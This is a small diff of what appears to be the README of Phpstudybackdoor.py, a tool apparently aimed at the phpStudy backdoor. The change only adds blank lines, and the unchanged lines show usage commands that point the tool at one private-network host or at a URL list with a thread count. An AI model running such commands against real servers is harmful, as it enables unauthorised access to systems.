@@ -5,7 +5,9 @@
 
 python3 Phpstudybackdoor.py -u http://192.168.3.106
 ![Image text](https://github.com/einzbernnn/PhpstudyBackdoor/blob/main/20.png)
+
 python3 Phpstudybackdoor.py -f url.txt
+
 
 python3 Phpstudybackdoor.py -f url.txt -t 20
 ![Image text](https://github.com/einzbernnn/PhpstudyBackdoor/blob/main/21.png)
